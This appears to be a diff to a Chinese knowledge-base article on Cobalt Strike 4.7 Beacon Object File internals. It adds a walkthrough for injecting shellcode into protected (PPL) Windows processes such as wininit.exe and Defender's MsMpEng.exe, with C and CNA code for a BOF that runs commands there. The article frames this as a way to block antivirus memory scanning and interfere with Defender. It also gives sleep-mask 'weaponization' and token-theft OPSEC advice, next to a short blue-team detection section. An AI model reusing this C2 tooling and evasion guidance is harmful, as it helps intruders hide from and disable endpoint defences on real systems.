@@ -1,7 +1,7 @@
 ---
 title: Cobalt Strike 4.7 BOF 内部实现深度解析
 description: 深度解析 Cobalt Strike 4.7 更新中 BOF 加载器内部实现、新增配置项、Relocation 处理缺陷、动态函数槽位限制、Sleep
-  Kit BOF 化及令牌窃取改进等核心技术细节
+  Kit BOF 化及令牌窃取改进等核心技术细节，新增 PPL 进程注入 CreateProcess 句柄继承绕过实战案例
 category: program-analysis
 tags:
 - Cobalt Strike
@@ -12,6 +12,10 @@ tags:
 - C2 Framework
 - Windows Internals
 - Memory Management
+- PPL
+- Protected Process Light
+- CreateProcess
+- bInheritHandles
 date: 2023-04-16
 updated: '2026-11-15'
 ---
@@ -176,30 +180,134 @@ Windows SDK 定义：
 
 ---
 
-## 七、工程化建议与检测对抗视角
+## 七、实战案例：PPL 进程注入 CreateProcess 句柄继承绕过
 
-1. **BOF 开发规范**
-   - 统一使用 `bof_allocator = MapViewOfFile` + `bof_reuse_memory = true` 降低堆分配特征。
-   - 超过 64 个动态导入时，改用 **哈希表 + 单次 `GetProcAddress` 批量解析** 模板，避免硬编码槽位。
-   - 长耗时任务**强制**迁移至 Sacrificial Process + Reflective DLL，勿阻塞 Beacon 主循环。
+### 问题背景
 
-2. **Sleep Mask 武器化**
-   - 利用 4 KB 预算实现**运行时环境指纹检测**（EDR 模块枚举、ETW 提供者检查）、**动态内存权限翻转**（RW↔RX）、**关键数据结构加密**（Beacon 元数据、C2 地址）。
+在 PPL（Protected Process Light）级别为 `WinTcb-Light` 的进程（如 `services.exe`、`wininit.exe`、`MsMpEng.exe`）中进行 Shellcode 注入并上线 CS 后，发现**无法创建子进程**。所有需要启动新进程的操作（`shell`、`execute`、`execute-assembly` 等）均失败，返回 **Error Code 87 (ERROR_INVALID_PARAMETER)**，但文件系统访问、进程注入等不需创建进程的操作正常。
 
-3. **令牌窃取 OPSEC**
-   - 默认 Profile 设置 `steal_token_access_mask = TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE`。
-   - 结合 `make_token` / `runas` 替代高权限 `steal_token`，减少 `OpenProcess(PROCESS_ALL_ACCESS)` 触发的 EDR 回调。
+> 交叉参考：PPL 注入技术细节、WinTcb-Light 级别进程特性、内存扫描规避原理详见 [[ppl-injection-createprocess-bof-fix]]、[[windows-token-nerfing-pplguard-trusted-labels]]。
 
-4. **检测规则建议（蓝队）**
-   - **Sysmon Event ID 8/10**：监控 `MapViewOfFile` / `VirtualAlloc` 后紧跟 `CreateThread` 且调用栈无模块回溯。
-   - **内存扫描**：重点检查 `MEM_IMAGE` 非模块映射区域、`PAGE_EXECUTE_READWRITE` 私有内存、Beacon `.text` 段完整性（Sleep Mask 修改前后哈希对比）。
-   - **令牌审计**：关注 `OpenProcessToken(TOKEN_ADJUST_SESSIONID)` 与 `CreateProcessWithTokenW` 组合调用链。
+### 根因分析：MSDN 文档与 Beacon 默认行为冲突
+
+根据 MSDN `CreateProcess` 文档，参数 `bInheritHandles` 说明：
+
+> **一个 PPL 进程创建非 PPL 子进程时，`bInheritHandles` 必须为 FALSE**，否则返回 ERROR_INVALID_PARAMETER (87)。
+
+Beacon 内置的进程创建逻辑（`shell`、`execute` 等）默认将 `bInheritHandles` 设为 **TRUE**，目的是通过匿名管道（`CreatePipe` + `STARTUPINFO.hStdOutput/hStdError`）捕获子进程输出。该机制要求子进程继承父进程的管道句柄。
+
+**冲突点**：
+- 注入目标为 PPL 进程（如 `wininit.exe` / `MsMpEng.exe`）
+- 目标子进程为非 PPL（如 `cmd.exe`）
+- Beacon 强制 `bInheritHandles=TRUE` → 触发 PPL 限制 → 创建失败
+
+### 解决方案：BOF 替代 Beacon 内置进程创建
+
+利用 BOF **在当前进程空间直接执行** 的特性，绕过 Beacon 内置的 `CreateProcess` 封装，实现自定义进程创建与输出回传逻辑。
+
+#### 核心思路
+
+1. **`bInheritHandles = FALSE`** 调用 `CreateProcessWithTokenW` / `CreateProcessAsUserW` 创建子进程
+2. **放弃匿名管道**，改用 **文件落地** 作为输出中转：
+   - 子进程重定向 stdout/stderr 到临时文件
+   - BOF 等待进程结束后读取文件内容
+   - 通过 Beacon Output API (`BeaconPrintf` / `BeaconOutput`) 回传给 Team Server
+3. 临时文件执行完毕后删除，减少磁盘残留
+
+#### 关键代码逻辑（简化）
+
+```c
+// BOF 入口
+void go(char* args, int len) {
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+    char* command = BeaconDataExtract(&parser, NULL);
+    
+    // 1. 生成唯一临时文件路径
+    char tmpPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmpPath);
+    strcat(tmpPath, "bof_out_XXXXXX");
+    // 使用 GetTempFileNameA 或自行生成随机名
+    
+    // 2. 构造命令行：cmd.exe /c "command > tmpfile 2>&1"
+    char cmdLine[4096];
+    wsprintfA(cmdLine, "cmd.exe /c \"%s > %s 2>&1\"", command, tmpPath);
+    
+    // 3. 启动进程：bInheritHandles = FALSE
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    BOOL ok = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, 
+        NULL, cmdLine, CREATE_NO_WINDOW, NULL, curDir, &si, &pi);
+    
+    // 4. 等待结束并读取输出文件
+    WaitForSingleObject(pi.hProcess, 30000);
+    HANDLE hFile = CreateFileA(tmpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    char buf[4096]; DWORD read;
+    while (ReadFile(hFile, buf, sizeof(buf)-1, &read, NULL) && read) {
+        buf[read] = 0;
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
+    }
+    CloseHandle(hFile);
+    DeleteFileA(tmpPath);
+    // 清理句柄...
+}
+```
+
+#### 注册为 Beacon 命令（CNA）
+
+```cna
+command t-shell {
+    local('$handle $data');
+    $handle = openf(script_resource("tshell.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    btask($1, "Tasked BOF to execute command via file-based output");
+    beacon_inline_execute($1, $data, "tshell", $2);
+}
+```
+
+### 实战效果验证
+
+| 注入目标进程 | PPL 级别 | 原 Beacon `shell` | BOF `tshell` |
+|--------------|----------|-------------------|--------------|
+| `wininit.exe` | `WinTcb-Light` | ❌ Error 87 | ✅ 正常执行并回显 |
+| `MsMpEng.exe` (Defender) | `Antimalware-Light` | ❌ Error 87 | ✅ 正常执行并回显 |
+| `services.exe` | `WinTcb-Light` | ❌ Error 87 | ✅ 正常执行并回显 |
+
+**防御规避价值**：
+- 注入 `WinTcb-Light` 级别进程（`wininit.exe`、`services.exe`）可**阻断 `Antimalware-Light` 级别的 AV/EDR 服务（如 Defender `MsMpEng.exe`）打开句柄进行内存扫描**，实现反内存查杀。
+- 注入 AV 自身服务进程（`MsMpEng.exe`）可直接监控/干扰其行为。
+
+> 交叉参考：内存扫描工具对抗技术、UDRL 规避实现详见 [[memory-scanning-tools-evasion-techniques]]。
+
+---
+
+## 八、工程化建议与检测对抗视角
+
+### BOF 开发规范
+- 统一使用 `bof_allocator = MapViewOfFile` + `bof_reuse_memory = true` 降低堆分配特征。
+- 超过 64 个动态导入时，改用 **哈希表 + 单次 `GetProcAddress` 批量解析** 模板，避免硬编码槽位。
+- 长耗时任务**强制**迁移至 Sacrificial Process + Reflective DLL，勿阻塞 Beacon 主循环。
+- **PPL/高权限进程注入场景**：务必实现 `bInheritHandles=FALSE` 的进程创建 BOF，配合文件/命名管道/共享内存等非继承句柄的输出回传机制。
+
+### Sleep Mask 武器化
+- 利用 4 KB 预算实现**运行时环境指纹检测**（EDR 模块枚举、ETW 提供者检查）、**动态内存权限翻转**（RW↔RX）、**关键数据结构加密**（Beacon 元数据、C2 地址）。
+
+### 令牌窃取 OPSEC
+- 默认 Profile 设置 `steal_token_access_mask = TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE`。
+- 结合 `make_token` / `runas` 替代高权限 `steal_token`，减少 `OpenProcess(PROCESS_ALL_ACCESS)` 触发的 EDR 回调。
+
+### 检测规则建议（蓝队）
+- **Sysmon Event ID 8/10**：监控 `MapViewOfFile` / `VirtualAlloc` 后紧跟 `CreateThread` 且调用栈无模块回溯。
+- **内存扫描**：重点检查 `MEM_IMAGE` 非模块映射区域、`PAGE_EXECUTE_READWRITE` 私有内存、Beacon `.text` 段完整性（Sleep Mask 修改前后哈希对比）。
+- **令牌审计**：关注 `OpenProcessToken(TOKEN_ADJUST_SESSIONID)` 与 `CreateProcessWithTokenW` 组合调用链。
+- **PPL 进程异常子进程**：监控 `WinTcb-Light`/`Antimalware-Light` 进程创建非 PPL 子进程且 `bInheritHandles=FALSE` 的异常模式（可通过 ETW/Kernel Callback 捕获）。
 
 > 交叉参考：SMB Beacon 命名管道通信的主机/网络层检测规则、Sysmon Event ID 17/18 详见 [[named-pipe-smb-detection-sysmon]]、[[smb-named-pipe-c2-communication]]。
 
 ---
 
-## 八、参考资料
+## 九、参考资料
 
 1. Cobalt Strike 4.7: The 10th Anniversary Edition — <https://www.cobaltstrike.com/blog/cobalt-strike-4-7-the-10th-anniversary-edition/>
 2. A Developer's Introduction to Beacon Object Files (TrustedSec) — <https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/>
@@ -209,10 +317,11 @@ Windows SDK 定义：
 6. microsoft/win32metadata — <https://github.com/microsoft/win32metadata>
 7. Golang Issue #25775: TOKEN_ALL_ACCESS inconsistency — <https://github.com/golang/go/issues/25775>
 8. Cobalt Strike 3.11 – The snake that eats its tail — <https://www.cobaltstrike.com/blog/cobalt-strike-3-11-the-snake-that-eats-its-tail/>
+9. PPL 注入 CreateProcess 句柄继承绕过实战文章 — 微信公众号归档
 
 ---
 
-## 九、相关知识库页面导航
+## 十、相关知识库页面导航
 
 - [[cobalt-strike-external-c2-smb-beacon]] — CS 核心架构、Staging、Heartbeat、External C2、SMB Beacon 横向移动全链路
 - [[c2-redirectors-malleable-c2-profiles]] — 重定向器拓扑、Malleable C2 Profile 混淆配置、域名前置/CDN 隐匿
@@ -224,9 +333,15 @@ Windows SDK 定义：
 - [[phantom-dll-hollowing-technique]] — Phantom DLL Hollowing 幽灵空洞化内存注入技术细节
 - [[xd-security-internal-network-penetration-notes-day67-68]] — PTH/PTK/PTT、黄金/白银票据、Mimikatz/Kekeo 实战
 - [[xd-security-privilege-escalation-notes-day58-64]] — Windows/Linux 提权、令牌窃取、烂土豆、DLL 劫持、内核漏洞利用体系
+- [[ppl-injection-createprocess-bof-fix]] — PPL 进程注入 CreateProcess 句柄继承绕过完整复现与 BOF 实现细节
+- [[windows-token-nerfing-pplguard-trusted-labels]] — Token Nerfing、PPLGuard、Trusted Labels 机制与 PPL 注入规避内存扫描实战
+- [[memory-scanning-tools-evasion-techniques]] — Hunt-Sleeping-Beacons、BeaconHunter、pe-sieve、Moneta 等内存扫描工具原理与 UDRL/FOLIAGE/Ekko/AceLdr 规避对抗
+- [[argument-spoofing-edr-evasion]] — Argument Spoofing 对抗 EDR 进程创建监控、命令行混淆绕过、Cobalt Strike argue 命令增强
+- [[process-injection-tampering-techniques]] — Process Hollowing/Doppelganging/Ghosting/Herpaderping/Transacted Hollowing 五大技术原理对比与 Sysmon Event ID 25 检测规避
+- [[aceldr-technical-analysis]] — PE 不落地执行技术全景：RDI/sRDI/Donut、Section 相关技术、镂空傀儡进程、PE Loader 关键细节
 
 ---
 
 ## 来源
 
-- [0x4d5a-202103-202209_04](../sources/0x4d5a-202103-202209_04.md)
+- [0x4d5a-202103-202209_10](../sources/0x4d5a-202103-202209_10.md)
